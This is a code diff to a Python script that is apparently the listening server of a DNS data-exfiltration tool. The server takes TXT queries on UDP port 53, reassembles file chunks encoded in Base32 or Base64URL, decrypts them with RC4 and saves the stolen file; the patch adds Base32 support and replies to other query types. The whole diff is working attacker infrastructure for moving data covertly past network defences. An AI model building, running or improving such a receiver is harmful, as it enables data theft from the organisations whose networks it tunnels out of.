@@ -3,7 +3,7 @@
 import argparse
 import socket
 from dnslib import *
-from base64 import b64encode, b64decode
+from base64 import b64decode, b32decode
 import sys
 
 #======================================================================================================
@@ -53,7 +53,7 @@ def progress(count, total, status=''):
 	sys.stdout.flush()
 
 #------------------------------------------------------------------------
-def decode(msg):
+def fromBase64URL(msg):
 	msg = msg.replace('_','/').replace('-','+')
 	if len(msg)%4 == 3:
 		return b64decode(msg + '=')
@@ -61,6 +61,25 @@ def decode(msg):
 		return b64decode(msg + '==')
 	else:
 		return b64decode(msg)
+
+#------------------------------------------------------------------------
+def fromBase32(msg):
+	# Base32 decoding, we need to add the padding back
+	# Add padding characters
+	mod = len(msg) % 8
+	if mod == 2:
+		padding = "======"
+	elif mod == 4:
+		padding = "===="
+	elif mod == 5:
+		padding = "==="
+	elif mod == 7:
+		padding = "="
+	else:
+		padding = ""
+
+	return b32decode(msg.upper() + padding)
+
 			
 #------------------------------------------------------------------------
 def color(string, color=None):
@@ -108,13 +127,7 @@ if __name__ == '__main__':
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-d", "--domain", help="The domain name used to exfiltrate data", dest="domainName", required=True)
 	parser.add_argument("-p", "--password", help="The password used to encrypt/decrypt exfiltrated data", dest="password", required=True)
-	args = parser.parse_args()
-
-	#------------------------------------------------------------------------------
-	# Check that required directories and path are available, if not create them
-	if not os.path.isdir("./output"):
-		os.makedirs("./output")
-		print color("[+] Creating [./output] directory for incoming files")
+	args = parser.parse_args() 
 
 	# Setup a UDP server listening on port UDP 53	
 	udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -122,24 +135,36 @@ if __name__ == '__main__':
 	print color("[*] DNS server listening on port 53")
 	
 	try:
+		useBase32 = False
 		chunkIndex = 0
 		fileData = ''
 		
 		while True:
 			data, addr = udps.recvfrom(1024)
 			request = DNSRecord.parse(data)
-			qname = str(request.q.qname)
+
 			#print color("[+] Received query: [{}] - Type: [{}]".format(qname, request.q.qtype))
 			
-			if request.q.qtype == 16:	
+			if request.q.qtype == 16:
+				
+				# Get the query qname
+				qname = str(request.q.qname)
+				
 				#-----------------------------------------------------------------------------
 				# Check if it is the initialization request
-				if qname.startswith("init."):
-					msg = decode(qname.split(".")[1])
+				if qname.upper().startswith("INIT."):
+					msgParts = qname.split(".")
 					
+					msg = fromBase32(msgParts[1])
 					fileName = msg.split('|')[0]		# Name of the file being exfiltrated
 					nbChunks = int(msg.split('|')[1])	# Total number of chunks of data expected to receive
 					
+					if msgParts[2].upper() == "BASE32":
+						useBase32 = True
+						print color("[+] Data was encoded using Base32")
+					else:
+						print color("[+] Data was encoded using Base64URL")
+
 					# Reset all variables
 					fileData = ''
 					chunkIndex = 0	
@@ -175,15 +200,22 @@ if __name__ == '__main__':
 							rc4Decryptor = RC4(args.password)
 							
 							# Save data to a file
-							outputFileName = "./output/" + fileName + ".zip"
+							outputFileName = fileName + ".zip"
 							print color("[+] Decrypting using password [{}] and saving to output file [{}]".format(args.password,outputFileName))
 							with open(outputFileName, 'wb+') as fileHandle:
-								fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(decode(fileData))))
+								if useBase32:
+									fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase32(fileData))))
+								else:
+									fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase64URL(fileData))))
 								fileHandle.close()
 								print color("[+] Output file [{}] saved successfully".format(outputFileName))
 						except IOError:
 							print color("[!] Could not write file [{}]".format(outputFileName))
-			
+				
+			# Query type is not TXT
+			else:
+				reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+				udps.sendto(reply.pack(), addr)
 	except KeyboardInterrupt:
 		pass
 	finally:
